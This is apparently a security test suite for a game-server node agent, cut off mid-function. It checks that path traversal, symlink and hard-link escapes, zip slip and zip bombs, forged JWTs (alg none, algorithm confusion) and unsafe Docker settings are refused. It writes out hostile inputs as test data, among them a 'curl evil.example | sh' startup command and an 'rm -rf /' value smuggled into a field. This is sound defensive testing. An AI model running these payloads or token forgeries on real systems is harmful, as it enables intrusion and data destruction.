#!/usr/bin/env python3
"""The node agent's security suite: what a hostile server cannot do.

A game server folder is the customer's -- and every plugin's in it. Assume
whatever runs there is trying to get out, and check that each way out is
shut:

  1. paths       ../, absolute paths, drive letters, NUL bytes
  2. links       a symlink (Linux) or junction (Windows) to outside the
                 folder is never followed, by any file operation
  3. races       a folder swapped for a link between the check and the use
  4. hard links  a second name for a file outside the folder
  5. archives    zip slip, link members, zip bombs
  6. tokens      browser tokens: forged, re-used for another server, file,
                 node or permission, expired, too long-lived, alg "none";
                 node tokens: missing, wrong
  7. the API     server A's browser token cannot touch server B, and a
                 path in a valid token still cannot leave the folder
  8. containers  the spec has every limit, and assert_safe() refuses each
                 rule broken one at a time
  9. config      the unisolated process runtime is refused unless asked for
 10. disk        the watchdog stops a server that fills its disk
 11. add-ons     the ports Geyser, Voice Chat and web maps open are found
                 and published -- and a config linked out is not followed

    python dev/tools/test_agent_security.py           # everything above
    python dev/tools/test_agent_security.py --live    # also the Docker tier

`--live` needs Docker on Linux and the runtime images (agent/images/). It
starts real containers that try to get out -- a memory hog, a fork bomb, a
disk filler, a read of another server's folder, a write to the root
filesystem, a look for the Docker socket -- and checks each is contained.
It has NOT been run on the machine this was written on (no Docker there);
see NEXT-SESSION.md.

On Linux the jail uses openat/O_NOFOLLOW and these tests exercise that
path; on Windows they exercise the development fallback (path checks plus
asking the open handle where it really is).
"""
from __future__ import annotations

import asyncio
import base64
import copy
import hashlib
import hmac
import io
import json
import os
import pathlib
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import uuid as uuidlib
import zipfile

ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "dev" / "tools"))

import _dbtest  # noqa: E402  -- before anything from app: temp STATE_DIR

import jwt  # noqa: E402
from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from agent import addons, auth, files  # noqa: E402
from agent.config import AgentConfig, load  # noqa: E402
from agent.containers import (NATIVE_TMP, ProcessRuntime, RuntimeError_,  # noqa: E402
                              UnsafeSpec, assert_safe, container_spec,
                              fresh_native_tmp, installer_spec, port_in_use)

LIVE = "--live" in sys.argv
TMP = pathlib.Path(tempfile.mkdtemp(prefix="bf-agent-sec-"))
SERVERS = TMP / "servers"
A_ID, B_ID = str(uuidlib.uuid4()), str(uuidlib.uuid4())
A, B = SERVERS / A_ID, SERVERS / B_ID
OUTSIDE = TMP / "outside"
SECRET = b"TOP SECRET: the node's own file"
results = []


def check(name, cond, extra=""):
    results.append(bool(cond))
    print(f"{'PASS' if cond else 'FAIL'}  {name}" + (f"  — {extra}" if extra else ""),
          flush=True)


def section(title):
    print(f"\n--- {title} " + "-" * max(4, 66 - len(title)), flush=True)


def refused(fn, *args, status=None, **kw) -> bool:
    try:
        fn(*args, **kw)
    except files.JailError as e:
        return status is None or e.status == status
    return False


def make_link(link: pathlib.Path, target: pathlib.Path, folder: bool = True) -> str | None:
    """A link, the way a server could make one: a symlink on Linux, a
    junction on Windows (which needs no privilege). None if this box cannot."""
    if os.name == "nt":
        if folder:
            import _winapi
            _winapi.CreateJunction(str(target), str(link))
            return "junction"
        try:
            os.symlink(target, link)
            return "symlink"
        except OSError:
            return None
    os.symlink(target, link, target_is_directory=folder)
    return "symlink"


def remove_link(link: pathlib.Path) -> None:
    try:
        os.unlink(link)
    except OSError:
        os.rmdir(link)          # a junction


def outside_untouched() -> bool:
    return (OUTSIDE / "secret.txt").read_bytes() == SECRET and \
        sorted(p.name for p in OUTSIDE.iterdir()) == ["level.dat", "secret.txt"]


def setup():
    for d in (A, B, OUTSIDE):
        d.mkdir(parents=True)
    (OUTSIDE / "secret.txt").write_bytes(SECRET)
    (OUTSIDE / "level.dat").write_bytes(b"SECRET-LEVEL")
    (A / "server.properties").write_bytes(b"motd=A\n")
    (B / "secret.txt").write_bytes(b"B's own secret")


# --- 1. paths -------------------------------------------------------------------------


def test_paths():
    section("1. paths")
    for bad in ["../x", "a/../../x", "..", "/etc/passwd", "C:/Windows/win.ini",
                "C:\\Windows\\win.ini", "\\\\host\\share\\x", "..\\..\\x",
                "a\x00b", f"../{B_ID}/secret.txt"]:
        check(f"the path {bad!r} is refused", refused(files.parts_of, bad))
    check("...and so is reading through one",
          refused(files.read_text, A, f"../{B_ID}/secret.txt"))
    for bad in ["", ".", "..", "a/b", "a\\b", "x" * 256, "a\x00"]:
        check(f"the name {bad[:20]!r} is refused", refused(files.check_name, bad))
    check("an ordinary nested path is fine", files.parts_of("world/region/r.0.0.mca")
          == ["world", "region", "r.0.0.mca"])


# --- 2. links -------------------------------------------------------------------------


def test_links():
    section("2. links")
    kind = make_link(A / "escape", OUTSIDE)
    check(f"(a {kind} to outside the folder was planted inside it)", kind)
    check("listing through it is refused", refused(files.list_dir, A, "escape", status=403))
    check("reading through it is refused",
          refused(files.read_text, A, "escape/secret.txt", status=403))
    check("writing through it is refused",
          refused(files.write_bytes, A, "escape/new.txt", b"x", status=403))
    check("making a folder through it is refused", refused(files.mkdir, A, "escape", "x"))
    check("renaming through it is refused",
          refused(files.rename, A, "escape/secret.txt", "taken.txt"))
    check("moving out through it is refused",
          refused(files.move, A, "escape/secret.txt", "."))
    check("moving in through it is refused",
          refused(files.move, A, "server.properties", "escape"))
    check("copying from it is refused", refused(files.copy, A, "escape/secret.txt", "."))
    check("copying the link itself is refused", refused(files.copy, A, "escape", "."))
    check("chmod through it is refused",
          refused(files.chmod, A, "escape/secret.txt", 0o777))
    check("deleting through it is refused",
          refused(files.delete, A, ["escape/secret.txt"]))
    listing = files.list_dir(A, ".")
    check("a listing shows it as a link, not a folder",
          listing["escape"].get("link") and not listing["escape"]["dir"], listing["escape"])
    check("search does not walk into it", files.search(A, "secret") == [])
    check("disk usage counts it as nothing",
          all(f["bytes"] == 0 for f in files.usage(A)["folders"] if f["name"] == "escape"))
    files.compress(A, ["."], "everything.zip")
    with zipfile.ZipFile(A / "everything.zip") as zf:
        names = zf.namelist()
    check("compressing the folder skips it", not any("secret" in n for n in names), names)
    files.delete(A, ["everything.zip"])

    # a link deeper down, inside a folder that is deleted whole
    (A / "data").mkdir()
    make_link(A / "data" / "inner", OUTSIDE)
    files.delete(A, ["data"])
    check("deleting a folder with a link in it removes the link, not what it points at",
          not (A / "data").exists() and outside_untouched())
    files.delete(A, ["escape"])
    check("deleting the link removes only the link",
          not os.path.lexists(A / "escape") and outside_untouched())

    file_kind = make_link(A / "passwd", OUTSIDE / "secret.txt", folder=False)
    if file_kind:
        check("reading a file symlink is refused",
              refused(files.read_bytes, A, "passwd", status=403))
        check("writing over a file symlink is refused, and the target is untouched",
              refused(files.write_bytes, A, "passwd", b"pwned") and outside_untouched())
        remove_link(A / "passwd")
    else:
        print("SKIP  file symlinks need Developer Mode on Windows; junctions cover links here")


# --- 3. races -------------------------------------------------------------------------


def test_races():
    section("3. a folder swapped for a link mid-operation")
    (A / "world").mkdir()
    (A / "world" / "level.dat").write_bytes(b"INSIDE")

    def swap():
        os.rename(A / "world", A / "world.real")
        make_link(A / "world", OUTSIDE)

    def unswap():
        remove_link(A / "world")
        os.rename(A / "world.real", A / "world")

    def attempt(fn_name, op):
        """Run `op` with the swap made on the first `os.<fn_name>` of level.dat."""
        real = getattr(os, fn_name)
        fired = []

        def hooked(path, *a, **kw):
            if not fired and "level.dat" in os.fspath(path):
                fired.append(True)
                swap()
            return real(path, *a, **kw)

        setattr(os, fn_name, hooked)
        try:
            try:
                out = op()
            except files.JailError as e:
                out = e
        finally:
            setattr(os, fn_name, real)
            if fired:
                unswap()
        return bool(fired), out

    for fn_name in ("open", "lstat", "stat"):
        fired, out = attempt(fn_name, lambda: files.read_bytes(A, "world/level.dat"))
        if not fired:
            continue
        check(f"a swap just before {fn_name}() never reads the outside file",
              out != b"SECRET-LEVEL" and (isinstance(out, files.JailError) or out == b"INSIDE"),
              repr(out)[:80])
    for fn_name in ("open", "lstat", "stat"):
        fired, out = attempt(fn_name, lambda: files.write_bytes(A, "world/level.dat", b"PWNED"))
        if not fired:
            continue
        check(f"a swap just before {fn_name}() never writes outside",
              outside_untouched() and (OUTSIDE / "level.dat").read_bytes() == b"SECRET-LEVEL",
              repr(out)[:80])
    check("(the swap was attempted at least once on this platform)",
          any(attempt(n, lambda: files.read_bytes(A, "world/level.dat"))[0]
              for n in ("open", "lstat", "stat")))
    shutil.rmtree(A / "world")


# --- 4. hard links --------------------------------------------------------------------


def test_concurrent_folders():
    section("3b. two writes making the same new folder at the same moment")
    import concurrent.futures
    errors = []

    def write(i):
        try:
            files.write_bytes(A, f"race/deep/er/f{i}.txt", b"x")
        except Exception as e:      # noqa: BLE001
            errors.append(repr(e))
    for _round in range(5):
        shutil.rmtree(A / "race", ignore_errors=True)
        with concurrent.futures.ThreadPoolExecutor(16) as pool:
            list(pool.map(write, range(16)))
    check("sixteen writes creating the same folders at once all land "
          "(one used to fail with a raw FileExistsError)",
          not errors and len(list((A / "race/deep/er").iterdir())) == 16, errors[:2])
    shutil.rmtree(A / "race", ignore_errors=True)
    if os.name != "nt":
        (A / "racelink").symlink_to(OUTSIDE, target_is_directory=True)
        check("...and a link where a folder would be made is still refused",
              refused(files.write_bytes, A, "racelink/x.txt", b"x", status=403)
              and outside_untouched())
        os.unlink(A / "racelink")


def test_hard_links():
    section("4. hard links")
    try:
        os.link(OUTSIDE / "secret.txt", A / "hard.txt")
    except OSError as e:
        print(f"SKIP  cannot make a hard link here ({e})")
        return
    check("reading a file with another name elsewhere is refused",
          refused(files.read_bytes, A, "hard.txt", status=403))
    check("writing it is refused, and the other name is untouched",
          refused(files.write_bytes, A, "hard.txt", b"pwned", status=403)
          and outside_untouched())
    check("copying it is refused", refused(files.copy, A, "hard.txt", "."))
    try:
        files.compress(A, ["hard.txt"], "h.zip")
        with zipfile.ZipFile(A / "h.zip") as zf:
            leaked = any(zf.read(n) == SECRET for n in zf.namelist())
    except files.JailError:
        leaked = False
    check("compressing it does not put the outside file in the archive", not leaked)
    for p in (A / "h.zip", A / "hard.txt"):
        if p.exists():
            p.unlink()


# --- 5. archives ----------------------------------------------------------------------


def make_zip(rel: str, members: list[tuple]) -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for m in members:
            name, data = m[0], m[1]
            if len(m) > 2:
                info = zipfile.ZipInfo(name)
                info.external_attr = m[2] << 16
                zf.writestr(info, data)
            else:
                zf.writestr(name, data)
    (A / rel).write_bytes(buf.getvalue())


def a_files() -> set[str]:
    return {p.relative_to(A).as_posix() for p in A.rglob("*")}


def test_archives():
    section("5. archives")
    before = a_files()
    for label, members in [
        ("../ in a member", [("ok.txt", "fine"), ("../evil.txt", "x")]),
        ("a member climbing out of a subfolder", [("a/../../evil.txt", "x")]),
        ("an absolute member", [("/evil.txt", "x")]),
        ("a drive-letter member", [("C:/evil.txt", "x")]),
        ("a backslash member", [("..\\evil.txt", "x")]),
        ("a link member", [("ok.txt", "fine"),
                           ("lnk", "../../outside", stat.S_IFLNK | 0o777)]),
    ]:
        make_zip("bad.zip", members)
        ok = refused(files.extract, A, "bad.zip")
        (A / "bad.zip").unlink()
        check(f"an archive with {label} is refused whole -- nothing extracted",
              ok and a_files() == before and not (SERVERS / "evil.txt").exists()
              and not (TMP / "evil.txt").exists())

    make_zip("big.zip", [("big.bin", b"\0" * (2 * 1048576))])
    check("an archive past the size limit is refused",
          refused(files.extract, A, "big.zip", limit=1048576, status=413)
          and not (A / "big.bin").exists())
    (A / "big.zip").unlink()

    # a bomb: 100 MB of zeros squeezed into ~100 KB
    with zipfile.ZipFile(A / "bomb.zip", "w", zipfile.ZIP_DEFLATED) as zf:
        with zf.open("bomb.bin", "w") as out:
            chunk = b"\0" * 1048576
            for _ in range(100):
                out.write(chunk)
    size = (A / "bomb.zip").stat().st_size
    check("a zip bomb (far more inside than its size could hold) is refused",
          refused(files.extract, A, "bomb.zip", status=413)
          and not (A / "bomb.bin").exists(), f"{size // 1024} KB claiming 100 MB")
    (A / "bomb.zip").unlink()

    make_zip("through.zip", [("escape/evil.txt", "x")])
    make_link(A / "escape", OUTSIDE)
    check("an archive member that lands on a planted link is refused",
          refused(files.extract, A, "through.zip") and outside_untouched())
    remove_link(A / "escape")
    (A / "through.zip").unlink()

    make_zip("good.zip", [("d/e/", ""), ("d/e/f.txt", "nested"), ("g/h.txt", "no dir entry"),
                          ("top.txt", "top")])
    written = files.extract(A, "good.zip")
    check("an honest archive extracts, nested folders included",
          (A / "d/e/f.txt").read_text() == "nested" and (A / "g/h.txt").exists()
          and len(written) == 3, written)
    files.delete(A, ["good.zip", "d", "g", "top.txt"])


# --- 6. tokens ------------------------------------------------------------------------


KEY = Ed25519PrivateKey.generate()
PUB = KEY.public_key().public_bytes(serialization.Encoding.PEM,
                                    serialization.PublicFormat.SubjectPublicKeyInfo).decode()
NODE = "node-1"
TOKENS = auth.BrowserTokens(PUB, NODE)


def sign(key=KEY, **over) -> str:
    now = int(time.time())
    claims = {"sub": "7", "srv": A_ID, "aud": NODE, "perm": ["console.read"],
              "iat": now, "exp": now + 300, **over}
    claims = {k: v for k, v in claims.items() if v is not None}
    return jwt.encode(claims, key, algorithm="EdDSA")


def b64(obj) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def denied(token, status=None, **want) -> bool:
    kw = {"server_uuid": A_ID, "perm": "console.read", **want}
    try:
        TOKENS.verify(token, **kw)
    except auth.Denied as e:
        return status is None or e.status == status
    return False


def test_tokens():
    section("6. tokens")
    check("a token the panel signed opens the console it is for",
          TOKENS.verify(sign(), server_uuid=A_ID, perm="console.read")["srv"] == A_ID)
    now = int(time.time())
    body = {"sub": "7", "srv": A_ID, "aud": NODE, "perm": ["console.read"],
            "iat": now, "exp": now + 300}
    none_token = f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64(body)}."
    check('alg "none" is refused', denied(none_token))
    head = f"{b64({'alg': 'HS256', 'typ': 'JWT'})}.{b64(body)}"
    mac = hmac.new(PUB.encode(), head.encode(), hashlib.sha256).digest()
    confused = head + "." + base64.urlsafe_b64encode(mac).rstrip(b"=").decode()
    check("HS256 keyed with the public key (algorithm confusion) is refused",
          denied(confused))
    check("a token signed by any other key is refused",
          denied(sign(key=Ed25519PrivateKey.generate())))
    good = sign()
    h, p, s = good.split(".")
    tampered = f"{h}.{b64({**jwt.decode(good, options={'verify_signature': False}), 'srv': B_ID})}.{s}"
    check("a token whose claims were edited is refused",
          denied(tampered, server_uuid=B_ID))
    check("a token for another node is refused", denied(sign(aud="node-2"), 403))
    check("a token with no audience is refused", denied(sign(aud=None)))
    check("an expired token is refused", denied(sign(iat=now - 400, exp=now - 100)))
    check("a token that lives more than ten minutes is refused",
          denied(sign(exp=now + 3600), 403))
    check("a token from the future is refused", denied(sign(iat=now + 300, exp=now + 500)))
    check("a token for another server is refused",
          denied(sign(srv=B_ID), 403))
    check("a read token cannot type commands", denied(sign(), 403, perm="console.command"))
    check("a token missing a claim (sub) is refused", denied(sign(sub=None)))
    check("a transfer token for one file does not cover another",
          denied(sign(perm=["files.read"], path="server.properties"), 403,
                 perm="files.read", path="ops.json"))
    check("a transfer needs a token that names its file",
          denied(sign(perm=["files.read"]), 403, perm="files.read", path="ops.json"))
    check("no token at all is refused", denied(None) and denied(""))
    check("garbage is refused", denied("not.a.token") and denied("x"))

    for header, label in [(None, "no header"), ("", "an empty header"),
                          ("Bearer tid.wrong", "the wrong token"),
                          ("Bearer tid.secre", "a prefix of the token"),
                          ("Basic dGlkLnNlY3JldA==", "another scheme"),
                          ("Bearer other.secret", "the wrong token id")]:
        try:
            auth.check_node_token(header, "tid", "secret")
            ok = False
        except auth.Denied as e:
            ok = e.status == 401
        check(f"the agent refuses a panel request with {label}", ok)
    auth.check_node_token("Bearer tid.secret", "tid", "secret")
    check("...and accepts the right one", True)


async def test_panel_side():
    """The panel's half: the config it writes is one the agent loads, the
    tokens it signs are ones the agent accepts, and no more."""
    from app import nodes
    from app.db.models import Node
    from app import db
    await _dbtest.fresh()
    made = await nodes.register(name="Sec node", fqdn="10.8.0.2", scheme="http",
                                runtime="process",
                                extra={"allow_unsafe_process_runtime": True,
                                       "servers_root": str(SERVERS)})
    cfg_path = TMP / "agent.toml"
    cfg_path.write_text(made["config"], encoding="utf-8")
    cfg = load(cfg_path)
    check("the config the panel writes is one the agent loads",
          cfg.node_id == "sec-node" and cfg.runtime == "process")
    async with db.session() as s:
        row = await s.get(Node, "sec-node")
        stored = row.token_encrypted
    check("the node token is stored encrypted, not as written in the config",
          cfg.token not in stored and nodes.decrypt(stored) == cfg.token)
    node = await nodes.verify_agent(f"Bearer {cfg.token_id}.{cfg.token}")
    check("the panel accepts the agent's token", node.id == "sec-node")
    for header in (None, f"Bearer {cfg.token_id}.nope", f"Bearer x.{cfg.token}",
                   f"{cfg.token_id}.{cfg.token}"):
        try:
            await nodes.verify_agent(header)
            ok = False
        except nodes.NodeError as e:
            ok = e.status == 401
        check(f"the panel refuses an agent token like {str(header)[:24]!r}", ok)
    tokens = auth.BrowserTokens(cfg.panel_public_key, cfg.node_id)
    tok, exp = await nodes.sign_browser_token(
        user={"id": 1, "username": "admin"}, server_uuid=A_ID, node_id="sec-node",
        perms=["console.read"], seconds=3600)
    check("the panel never signs for more than ten minutes, even when asked",
          exp - time.time() <= 601)
    check("the agent accepts what the panel signs",
          tokens.verify(tok, server_uuid=A_ID, perm="console.read")["sub"] == "1")
    try:
        auth.BrowserTokens(cfg.panel_public_key, "another-node").verify(
            tok, server_uuid=A_ID, perm="console.read")
        ok = False
    except auth.Denied:
        ok = True
    check("...and another node does not", ok)
    await db.dispose()


# --- 7. the agent's API ---------------------------------------------------------------


def test_api():
    section("7. the agent's API: one server's token never reaches another")
    from fastapi.testclient import TestClient
    from agent.main import create_app
    cfg = AgentConfig(node_id=NODE, token_id="tid", token="secret",
                      panel_url="http://127.0.0.1:9", panel_public_key=PUB,
                      servers_root=SERVERS, state_dir=TMP / "agent-state",
                      runtime="process", allow_unsafe_process_runtime=True)
    node = {"Authorization": "Bearer tid.secret"}
    with TestClient(create_app(cfg)) as tc:
        for sid, port in ((A_ID, 30001), (B_ID, 30002)):
            r = tc.put(f"/v1/servers/{sid}", json={"name": sid[:4], "port": port},
                       headers=node)
            assert r.status_code == 200, r.text
        check("every /v1 route wants the node token",
              tc.get("/v1/servers").status_code == 401
              and tc.get(f"/v1/servers/{A_ID}/files").status_code == 401
              and tc.get("/v1/servers", headers={"Authorization": "Bearer tid.x"})
              .status_code == 401)
        r = tc.get(f"/v1/servers/{A_ID}/files/content",
                   params={"path": f"../{B_ID}/secret.txt"}, headers=node)
        check("even the panel cannot read outside a server's folder", r.status_code == 400)

        def dl(token, server, path):
            return tc.get("/v1/download", params={"token": token, "server": server,
                                                  "path": path})
        tok = sign(perm=["files.read"], path="server.properties")
        r = dl(tok, A_ID, "server.properties")
        check("a download token fetches its one file", r.status_code == 200
              and r.content == b"motd=A\n")
        check("...not the same path on another server",
              dl(tok, B_ID, "server.properties").status_code == 403)
        check("...not another file on its own server",
              dl(tok, A_ID, "secret.txt").status_code == 403)
        tok_b = sign(perm=["files.read"], path="secret.txt")
        check("a token for A naming B's file is still refused",
              dl(tok_b, B_ID, "secret.txt").status_code == 403)
        evil = sign(perm=["files.read"], path=f"../{B_ID}/secret.txt")
        check("a validly signed token naming ../ still cannot leave the folder",
              dl(evil, A_ID, f"../{B_ID}/secret.txt").status_code == 400)
        check("a console token cannot download",
              dl(sign(path="server.properties"), A_ID, "server.properties").status_code == 403)
        os.link(OUTSIDE / "secret.txt", A / "hard.txt")
        r = dl(sign(perm=["files.read"], path="hard.txt"), A_ID, "hard.txt")
        check("a hard link is not served to a browser either",
              r.status_code == 403 and SECRET not in r.content)
        (A / "hard.txt").unlink()

        def up(token, server, path, data=b"uploaded"):
            return tc.post("/v1/upload", params={"token": token, "server": server,
                                                 "path": path}, content=data)
        check("a read token cannot upload",
              up(sign(perm=["files.read"], path="x.txt"), A_ID, "x.txt").status_code == 403
              and not (A / "x.txt").exists())
        wtok = sign(perm=["files.write"], path="plugins/x.jar")
        check("a write token uploads its one file",
              up(wtok, A_ID, "plugins/x.jar").status_code == 200
              and (A / "plugins/x.jar").read_bytes() == b"uploaded")
        check("...and not to another path",
              up(wtok, A_ID, "plugins/y.jar").status_code == 403)
        check("...nor to another server",
              up(wtok, B_ID, "plugins/x.jar").status_code == 403
              and not (B / "plugins").exists())

        from starlette.websockets import WebSocketDisconnect
        for label, token, server in [
            ("A's console token on B's console", sign(), B_ID),
            ("a token for another node", sign(aud="node-2"), A_ID),
            ("no token", "", A_ID),
            ("an expired token", sign(iat=int(time.time()) - 900,
                                      exp=int(time.time()) - 300), A_ID)]:
            try:
                with tc.websocket_connect(f"/v1/servers/{server}/ws?token={token}") as ws:
                    ws.receive_json()
                ok = False
            except WebSocketDisconnect as e:
                ok = e.code == 4401
            check(f"the console refuses {label}", ok)
        with tc.websocket_connect(f"/v1/servers/{A_ID}/ws?token={sign()}") as ws:
            first = ws.receive_json()
            ws.send_json({"type": "command", "command": "op attacker"})
            reply = ws.receive_json()
        check("a read-only console token opens the console but cannot type",
              first["type"] == "backlog" and first["may_type"] is False
              and reply["type"] == "error", reply)


# --- 8. containers --------------------------------------------------------------------


def docker_cfg(**over) -> AgentConfig:
    return AgentConfig(node_id="n1", token_id="t", token="t", panel_url="http://x",
                       panel_public_key=PUB,
                       servers_root=pathlib.PurePosixPath("/srv/blessforge/servers"),
                       game_bind_ip="10.8.0.2", **over)


def test_containers():
    section("8. the container spec, and assert_safe()")
    cfg = docker_cfg()
    folder = cfg.server_dir(A_ID)
    server = {"uuid": A_ID, "port": 25565, "java_major": 21, "memory_mb": 2560,
              "execution_command": "java -Xms2G -Xmx2G -jar server.jar nogui",
              "limits": {"cpu_pct": 200}}
    spec = container_spec(server, cfg, folder)
    hc = spec["HostConfig"]
    try:
        assert_safe(spec, cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("the spec the agent builds passes its own check", ok is True, ok)
    mib = 1024 * 1024
    check("memory is capped, and swap equals it (no swap to hide in)",
          hc["Memory"] == hc["MemorySwap"] == 2560 * mib)
    check("CPU is capped (200% = two cores)", hc["NanoCpus"] == 2_000_000_000)
    check("...and shared by weight under contention (an equal 1024), not pinned",
          hc["CpuShares"] == 1024 and "CpusetCpus" not in hc)
    pinned = container_spec({**server, "limits": {"cpu_pct": 200, "cpuset": "0-3",
                                                  "cpu_shares": 2048}}, cfg, folder)
    nonsense = container_spec({**server, "limits": {"cpuset": "0-3; rm -rf /"}}, cfg, folder)
    try:
        assert_safe(pinned, cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("a big pack can be pinned to cores and weighted, and still passes the check",
          ok is True and pinned["HostConfig"]["CpusetCpus"] == "0-3"
          and pinned["HostConfig"]["CpuShares"] == 2048, ok)
    check("...a cpuset that is not one is ignored, never passed to Docker",
          "CpusetCpus" not in nonsense["HostConfig"])
    check("a PID limit is set", hc["PidsLimit"] == cfg.pids_limit > 0)
    check("every capability is dropped, none added",
          hc["CapDrop"] == ["ALL"] and not hc["CapAdd"])
    check("no-new-privileges", "no-new-privileges:true" in hc["SecurityOpt"])
    check("the root filesystem is read-only; /tmp is tmpfs and noexec",
          hc["ReadonlyRootfs"] and list(hc["Tmpfs"]) == ["/tmp"]
          and "noexec" in hc["Tmpfs"]["/tmp"])
    check("the JVM's temp folder is in the server folder (native libraries load there)",
          f"JAVA_TOOL_OPTIONS=-Djava.io.tmpdir=/server/{NATIVE_TMP}" in spec["Env"])

    # The native temp folder is emptied at each start: a link planted in its
    # place is removed, never followed, and nothing outside is touched.
    box = TMP / "native-tmp"
    box.mkdir()
    kind = make_link(box / NATIVE_TMP, OUTSIDE)
    if kind:
        fresh_native_tmp(box)
        made = box / NATIVE_TMP
        check(f"a {kind} planted as the native temp folder is replaced, not followed",
              made.is_dir() and not made.is_symlink() and outside_untouched()
              and not any(made.iterdir()))
    (box / NATIVE_TMP / "jna123.tmp").write_bytes(b"old")
    fresh_native_tmp(box)
    check("...and it starts empty each time",
          (box / NATIVE_TMP).is_dir() and not any((box / NATIVE_TMP).iterdir()))
    check("the only mount is the server's own folder",
          hc["Binds"] == [f"{folder}:/server:rw"] and not hc.get("Mounts"))
    check("the Docker socket is nowhere in it", "docker.sock" not in json.dumps(spec))
    check("not privileged, not the host network, PID or IPC namespace",
          not hc["Privileged"] and hc["NetworkMode"] != "host"
          and hc["PidMode"] != "host" and hc["IpcMode"] != "host")
    check("an unprivileged user", spec["User"] == "1000:1000")
    check("the game port is published on the game address only",
          all(b["HostIp"] == "10.8.0.2" for bs in hc["PortBindings"].values() for b in bs))
    check("Docker does not restart it (the agent does, and sees crash loops)",
          hc["RestartPolicy"] == {"Name": "no"})
    hostile = container_spec({**server, "execution_command":
                              "java -jar server.jar; curl evil.example | sh"}, cfg, folder)
    check("the startup command is argv, never a shell: '; | sh' are just arguments",
          hostile["Cmd"][0] == "java" and "-c" not in hostile["Cmd"]
          and hostile["Entrypoint"] == ["/usr/local/bin/bf-entry"], hostile["Cmd"])
    images = {m: cfg.image_for(m) for m in (8, 11, 16, 17, 21, 22, 25, None)}
    check("the image follows the Java major, rounding up (25 for Minecraft 26.x)",
          images[8].endswith("java8") and images[11].endswith("java17")
          and images[17].endswith("java17") and images[21].endswith("java21")
          and images[22].endswith("java25") and images[25].endswith("java25")
          and images[None].endswith("java21"), images)
    inst = installer_spec(server, cfg, folder, ["java", "-jar", "installer.jar",
                                                "--installServer"])
    try:
        assert_safe(inst, cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("the installer container is just as locked down, and publishes no port",
          ok is True and not inst["HostConfig"]["PortBindings"], ok)

    def bind(f):
        return lambda s: s["HostConfig"].__setitem__("Binds", [f"{f}:/server:rw"])
    hcset = lambda k, v: (lambda s: s["HostConfig"].__setitem__(k, v))  # noqa: E731
    mutations = [
        ("privileged", hcset("Privileged", True)),
        ("an added capability", hcset("CapAdd", ["SYS_ADMIN"])),
        ("capabilities not dropped", hcset("CapDrop", [])),
        ("only some capabilities dropped", hcset("CapDrop", ["NET_RAW"])),
        ("no no-new-privileges", hcset("SecurityOpt", [])),
        ("no-new-privileges:false", hcset("SecurityOpt", ["no-new-privileges:false"])),
        ("seccomp=unconfined", hcset("SecurityOpt", ["no-new-privileges:true",
                                                     "seccomp=unconfined"])),
        ("apparmor=unconfined", hcset("SecurityOpt", ["no-new-privileges:true",
                                                      "apparmor=unconfined"])),
        ("the host network", hcset("NetworkMode", "host")),
        ("another container's network", hcset("NetworkMode", "container:bf-other")),
        ("the host PID namespace", hcset("PidMode", "host")),
        ("the host IPC namespace", hcset("IpcMode", "host")),
        ("the host UTS namespace", hcset("UTSMode", "host")),
        ("the host user namespace", hcset("UsernsMode", "host")),
        ("the host cgroup namespace", hcset("CgroupnsMode", "host")),
        ("no memory limit", hcset("Memory", 0)),
        ("unlimited swap", hcset("MemorySwap", -1)),
        ("swap above memory", hcset("MemorySwap", 2 * 2560 * mib)),
        ("no CPU limit", hcset("NanoCpus", 0)),
        ("no PID limit", hcset("PidsLimit", 0)),
        ("an unlimited PID limit", hcset("PidsLimit", -1)),
        ("a writable root filesystem", hcset("ReadonlyRootfs", False)),
        ("a host device", hcset("Devices", [{"PathOnHost": "/dev/kvm"}])),
        ("a GPU request", hcset("DeviceRequests", [{"Count": -1}])),
        ("a Mounts entry", hcset("Mounts", [{"Source": "/", "Target": "/host"}])),
        ("volumes from another container", hcset("VolumesFrom", ["bf-other"])),
        ("the Docker socket", lambda s: s["HostConfig"]["Binds"].append(
            "/var/run/docker.sock:/var/run/docker.sock")),
        ("another server's folder", bind(cfg.server_dir(B_ID))),
        ("the whole servers root", bind(cfg.servers_root)),
        ("the folder read-write elsewhere", hcset("Binds", [f"{folder}:/etc:rw"])),
        ("sysctls", hcset("Sysctls", {"net.ipv4.ip_forward": "1"})),
        ("a cgroup parent", hcset("CgroupParent", "/")),
        ("root", lambda s: s.__setitem__("User", "0:0")),
        ("root by name", lambda s: s.__setitem__("User", "root")),
        ("no user (the image's default, often root)", lambda s: s.__setitem__("User", "")),
        ("a port on every address", lambda s: s["HostConfig"]["PortBindings"]
         ["25565/tcp"][0].__setitem__("HostIp", "")),
        ("a port on 0.0.0.0", lambda s: s["HostConfig"]["PortBindings"]
         ["25565/udp"][0].__setitem__("HostIp", "0.0.0.0")),
        ("a game port published as another host port", lambda s: s["HostConfig"]
         ["PortBindings"]["25565/tcp"][0].__setitem__("HostPort", "80")),
        ("a port Docker may pick itself", lambda s: s["HostConfig"]
         ["PortBindings"]["25565/tcp"][0].__setitem__("HostPort", "")),
        ("a privileged port", lambda s: s["HostConfig"]["PortBindings"].__setitem__(
            "22/tcp", [{"HostIp": "10.8.0.2", "HostPort": "22"}])),
        ("an unknown protocol", lambda s: s["HostConfig"]["PortBindings"].__setitem__(
            "25570/sctp", [{"HostIp": "10.8.0.2", "HostPort": "25570"}])),
        ("a whole range of ports", lambda s: s["HostConfig"]["PortBindings"].update(
            {f"{p}/tcp": [{"HostIp": "10.8.0.2", "HostPort": str(p)}]
             for p in range(30000, 30020)})),
        ("another tmpfs", hcset("Tmpfs", {"/tmp": "rw", "/run": "rw"})),
        ("a Docker restart policy", hcset("RestartPolicy", {"Name": "always"})),
    ]
    for label, mutate in mutations:
        bad = copy.deepcopy(spec)
        mutate(bad)
        try:
            assert_safe(bad, cfg, folder)
            ok = False
        except UnsafeSpec:
